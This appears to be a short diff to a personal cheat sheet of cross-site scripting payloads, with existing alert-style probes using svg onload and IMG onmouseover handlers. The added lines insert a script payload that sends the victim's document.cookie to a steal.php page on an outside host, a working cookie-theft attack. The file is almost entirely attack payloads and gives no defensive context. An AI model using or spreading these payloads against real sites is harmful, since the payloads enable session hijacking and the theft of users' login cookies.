@@ -3,3 +3,8 @@ always try to inpuit " ' >
 <svg/onload=alert('XSS')>
 <IMG SRC= onmouseover="alert('xxs')">
 <IMG onmouseover="alert('xxs')">
+
+<IMG """><script type="text/javascript">
+document.location='http://me.foomegahost.com/ticketAttachments/4b3519fbe17e82993e76927e5f253e33/steal.php?q='+document.cookie;
+</script>
+
